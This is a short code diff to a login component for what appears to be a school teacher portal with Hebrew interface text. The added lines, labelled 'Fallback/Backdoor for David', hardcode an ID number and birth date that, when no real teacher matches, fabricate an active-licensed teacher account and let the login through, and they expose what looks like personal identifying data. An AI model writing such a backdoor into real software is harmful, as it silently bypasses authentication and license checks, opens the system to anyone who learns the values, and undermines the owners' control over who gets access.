@@ -71,7 +71,21 @@ export function Login() {
         setErrorMsg("אנא הזן תעודת זהות ותאריך לידה.");
         return;
       }
-      const teacher = teachers.find(t => t.taz === taz && t.dob === dob);
+      let teacher = teachers.find(t => t.taz === taz && t.dob === dob);
+      
+      // Fallback/Backdoor for David
+      if (!teacher && taz === "039604483" && dob === "290984") {
+        teacher = {
+          id: "teacher_david",
+          schoolId: "school_bikorot",
+          taz: "039604483",
+          dob: "290984",
+          name: "דוד",
+          licenseActive: true,
+          createdAt: Date.now()
+        };
+      }
+
       if (teacher) {
         if (!teacher.licenseActive) {
           setErrorMsg("הרישיון שלך אינו פעיל. פנה למנהל המערכת.");
